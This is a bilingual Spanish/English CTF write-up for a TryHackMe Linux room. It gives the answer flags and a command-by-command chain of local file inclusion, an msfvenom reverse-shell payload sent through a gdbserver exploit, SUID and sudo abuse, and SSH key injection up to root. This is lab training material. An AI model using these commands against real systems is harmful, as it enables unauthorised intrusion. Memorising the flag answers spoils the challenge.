# Airplane [MEDIUM]

### Información de la Sala / Room Information

* **Dificultad / Difficulty:** MEDIUM
* **Tipo / Type:** CTF (Free)
* **Slug:** `airplane`
* **Link:** https://tryhackme.com/room/airplane
* **Sección / Section:** Linux / CTF
* **Fuente / Source:** Writeup de Sidharth Panda (InfoSec Write-ups), 0xBEN (benheater.com) y naval0505 (GitHub)

---

## Solucionario de Tareas / Task Solutions

> **ES:** Máquina Linux de dificultad media. "Are you ready to fly?" — la cadena de ataque combina LFI, enumeración de /proc, explotación de gdbserver, abuso de SUID y una regla sudo mal configurada.
> **EN:** Medium difficulty Linux machine. "Are you ready to fly?" — the attack chain combines LFI, /proc enumeration, gdbserver exploitation, SUID abuse, and a misconfigured sudo rule.

---

### Task 1 — Flags

| Pregunta / Question | Respuesta / Answer |
|----------|--------|
| What is the user flag? | `eebfca2ca5a2b8a56c46c781aeea7562` |
| What is the root flag? | `190dcbeb688ce5fe029f26a1e5fce002` |

---

## Metodología / Methodology

1. **Reconocimiento / Recon:** añadir `airplane.thm` a `/etc/hosts`. Escanear con `rustscan airplane.thm -- -A -vvv` o `nmap -p-`. Se descubren 3 puertos abiertos, incluyendo una aplicación web Werkzeug en el puerto 8000 y un servicio en el puerto 6048.
2. **Enumeración web / Web enumeration:** usar `ffuf` para descubrir directorios. Encontrar un parámetro `?page=` vulnerable a **LFI (Local File Inclusion)**.
3. **LFI + /proc / LFI + /proc:** leer `/etc/passwd` para enumerar usuarios (hudson, carlos). Escribir un script Python para iterar sobre `/proc/<pid>/cmdline` y descubrir los procesos en ejecución. Encontrar un proceso **gdbserver** escuchando en el puerto 6048 (nmap no lo reconoce como servicio).
4. **Explotar gdbserver / Exploit gdbserver:** usar `searchsploit gdbserver` (exploit `linux/remote/50539.py`). Generar un payload con `msfvenom -p linux/x64/shell_reverse_tcp LHOST=<vpn_ip> LPORT=<port> PrependFork=true -o pay.bin`. Iniciar listener con `nc` y ejecutar `python3 50539.py airplane.thm:6048 pay.bin` para obtener una shell como **hudson**.
5. **Escalada a carlos / Escalate to carlos:** buscar binarios SUID con `find / -type f -perm -4000 2>/dev/null`. Encontrar el binario `find` con SUID (propietario carlos). Usar GTFOBins: `find . -exec /bin/sh -p \; -quit` para obtener una shell con euid de carlos. Inyectar una clave SSH pública en `/home/carlos/.ssh/authorized_keys` y hacer `ssh carlos@airplane.thm`. Leer `user.txt` → `eebfca2ca5a2b8a56c46c781aeea7562`.
6. **Escalada a root / Escalate to root:** ejecutar `sudo -l`. Descubrir una regla sudo que permite ejecutar Ruby con wildcard `/root/*.rb`. Abusar de path traversal: crear `/tmp/shell.rb` con `exec "/bin/sh"` y ejecutar `sudo /usr/bin/ruby /root/../tmp/shell.rb` para obtener una shell root. Leer `/root/root.txt` → `190dcbeb688ce5fe029f26a1e5fce002`.

### Cadena de ataque / Attack Chain

```
Nmap → Werkzeug Web App → Directory Enumeration → LFI (?page=) → /etc/passwd → /proc → gdbserver (6048) → Metasploit gdb_server_exec → Shell as hudson → SUID find → Shell as carlos → SSH key injection → User flag → sudo ruby wildcard → Path traversal → Root shell → Root flag
```

**Lección:** encadenar vulnerabilidades aparentemente menores (LFI, información de /proc, gdbserver expuesto, SUID mal configurado, sudo con wildcard) permite el compromiso total del sistema. Los servicios de depuración (gdbserver) no deben estar expuestos, y las reglas sudo con wildcards son peligrosas.

---

*Documentación para propósitos educativos y registro de CTF.*